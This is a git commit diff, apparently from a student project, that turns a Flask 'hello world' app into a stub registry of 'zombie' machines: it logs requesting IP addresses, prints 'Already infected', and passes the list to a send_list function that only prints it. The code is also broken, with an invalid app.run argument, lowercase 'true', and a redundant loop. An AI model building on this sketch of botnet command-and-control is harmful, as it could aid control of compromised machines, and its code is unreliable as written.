e330da13c9fbad05a13895b8d2c3ec31cc52a7f9
Alexis <alexis.heslouin@ecole.ensicaen.fr>
2021-09-29 15:27:34 +0200

    get ip from request & diffuse it

--- app.py
+++ app.py
@@ -1,12 +1,23 @@
-from flask import Flask
+from flask import Flask, request
 
 app = Flask(__name__)
+zombies = ["192.168.10.5", "10.104.12.10"]
 
 
-@app.route('/')
-def hello_world():  # put application's code here
-    return 'Hello World!'
+@app.route('/', methods=["GET"])
+def register_machine():
+    if request.remote_addr not in zombies:
+        zombies.append(request.remote_addr)
+        for item in zombies:
+            send_list(zombies)
+    else:
+        print("Already infected")
+    return "hello world"
+
+def send_list(ip):
+    print(ip)
 
 
 if __name__ == '__main__':
-    app.run()
+    app.run(run="0.0.0.0",debug=true)
+    register_machine()
